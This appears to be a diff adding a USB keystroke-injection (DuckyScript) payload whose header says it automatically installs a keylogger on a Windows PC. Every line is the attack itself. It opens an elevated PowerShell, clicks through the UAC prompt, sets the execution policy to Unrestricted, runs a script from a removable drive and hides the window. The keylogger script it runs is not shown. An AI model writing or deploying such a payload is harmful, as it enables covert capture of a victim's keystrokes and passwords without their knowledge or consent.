@@ -1,0 +1,45 @@
+REM Automatic installation of a keylogger on a Windows PC
+REM Eduard Sagnier
+
+GUI r
+DELAY 300
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 400
+ENTER
+DELAY 800
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 800
+STRING Set-ExecutionPolicy RemoteSigned
+DELAY 200
+ENTER
+DELAY 400
+STRING o
+DELAY 200
+ENTER
+DELAY 800
+STRING Set-ExecutionPolicy Unrestricted
+DELAY 200
+ENTER
+DELAY 600
+STRING o
+DELAY 200
+ENTER
+DELAY 600
+STRING cd F:\
+DELAY 300
+ENTER
+DELAY 300
+STRING .\script.ps1
+DELAY 300
+ENTER
+DELAY 300
+ALT SPACE
+DELAY 100
+STRING n
+
+
+REM All done. 
+
+
